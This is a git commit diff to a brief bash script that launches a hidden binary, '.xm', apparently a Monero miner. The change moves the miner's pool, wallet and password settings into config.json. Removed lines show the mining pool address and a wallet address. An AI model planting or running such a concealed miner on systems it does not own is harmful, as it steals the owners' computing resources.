e9218ab050e69a723f9d33c69eb67aac6857d13d
xAezteru_ <veraezter@gmail.com>
2025-04-17 20:28:03 +0700

    Update s.sh

--- s.sh
+++ s.sh
@@ -1,4 +1,7 @@
 #!/bin/bash
 
+pw="Miner-$(( (RANDOM << 15 | RANDOM) % 1000000 + 1 ))"
+sed -i "s/\"pass\": \".*\"/\"pass\": \"$pw\"/" config.json
+chmod +x .xm
 clear
-./.xm -o pool.supportxmr.com:7777 -u 43Mk3jUjBwkbfLishws1FzTMJkjRnYyKb5uuuPQM59UDLHjvzB1nP5HBZaYisfTRWJHzYdKpe5LnBHZWbih3DRebQM3DZ7o -p "Miner-$(( (RANDOM << 15 | RANDOM) % 1000000 + 1 ))"
+./.xm --config config.json
